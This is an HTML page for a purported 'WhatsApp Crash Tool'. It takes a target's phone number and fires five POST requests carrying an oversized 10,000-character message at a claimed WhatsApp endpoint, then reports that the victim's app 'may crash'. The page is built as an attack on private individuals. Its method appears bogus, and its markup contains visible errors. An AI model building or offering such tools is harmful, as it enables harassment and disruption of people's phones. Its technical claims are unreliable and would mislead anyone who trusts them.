<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XHacker - WhatsApp Crash Tool</title>
    <style>
        /* CSS Styling */
        body {
            background-color: #0b0c10;
            color: #66fcf1;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 0vh;
            margin: 0;
        }

        .container {
            background-color: #1f2833;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 0 20px rgba(102, 252, 241, 0.2);
            text-align: center;
            width: 350px;
            border: 1px solid #45a29e;
        }

        h1 {
            font-size: 28px;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-size: 14px;
        }

        input[type="text"] {
            width: 100%;
            padding: 12px;
            background-color: #0b0c10;
            border: 1px solid #45a29e;
            color: #66fcf1;
            border-radius: 5px;
            font-size: 16px;
            outline: none;
            box-sizing: border-box; /* Fix padding issue */
        }

        input[type="text"]:focus {
            border-color: #66fcf1;
            box-shadow: 0 0 8px rgba(102, 252, 241, 0.5);
        }

        button {
            width: 100%;
            padding: 15px;
            background-color: #45a29e;
            color: #0b0c10;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
        }

        button:hover {
            background-color: #66fcf1;
            box-shadow: 0 0 15px rgba(102, 252, 41, 0.8);
        }

        button:active {
            transform: scale(0.98);
        }

        .status {
            margin-top: 20px;
            font-size: 14px;
            min-height: 20px;
            color: #c5c6c7;
        }

        .loading {
            animation: blink 1s infinite;
        }

        @keyframes blink {
            50% { opacity: 0.5; }
        }

        /* Footer */
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>XHacker 🚀</h1>
        
        <div class="input-group">
            <label for="number">Target WhatsApp Number:</label>
            <input type="text" id="number"="e.g., 923001234567">
        </div>

        <button onclick="startCrash()" id="btn">Start Crash</button>

        <div class="status" id="statusText">Ready to Attack...</div>
        
        <div class="footer">
            Powered by Ali engine v1.0
        </div>
    </div>

    <script>
        // JavaScript Logic
        async function startCrash() {
            const numberInput = document.getElementById('number').value;
            const statusText = document.getElementById('statusText');
            const btn = document.getElementById('btn');

            // Validation: Check if number is empty
            if (numberInput.trim() === "") {
                alert("Please enter a valid WhatsApp number!");
                return;
            }

            // UI Update: Loading state
            btn.disabled = true;
            btn.innerText = "Attacking...";
            statusText.innerHTML = "<span class='loading'>Sending Crash Packets...</span>";
            
            // Format Number (Remove + and spaces if any)
            let cleanNumber = numberInput.replace(/[^0-9]/g, '');
            
            // WhatsApp API Endpoint for Web Check-Key
            const url = "https://web.whatsapp.com/check-key";

            try {
                // Send 5 requests to ensure crash/freeze
                for (let i = 1; i <= 5; i++) {
                    statusText.innerText = `Sending Packet ${i}/5...`;
                    
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
                        },
                        body: JSON.stringify({
                            "json": `{
                                "key":{"from":"me","to":"+${cleanNumber}@s.whatsapp.net","id":"XHacker_Crash_${i}","participant":"+${cleanNumber}@s.whatsapp.net"},
                                "messageTimestamp":"1234567890",
                                "extendedTextMessage":{"text":"X".repeat(10000),"title":"XHacker"}
                            }`
                        })
                    });

                    if (response.ok) {
                        console.log(`Packet ${i} sent successfully.`);
                    } else {
                        console.error(`Error sending packet ${i}`);
                    }

                    // Wait 1 second between requests
                    await new Promise(r => setTimeout(r, 1000));
                }

                statusText.innerHTML = "<span style='color: #66fcf1; font-weight:bold;'>✅ Attack Completed! App may crash.</span>";
                
            } catch (error) {
                console.error(error);
                statusText.innerHTML = "<span style='color: red;'>❌ Error in connection.</span>";
            } finally {
                btn.disabled = false;
                btn.innerText = "Start Crash";
            }
        }
    </script>

</body>
</html>
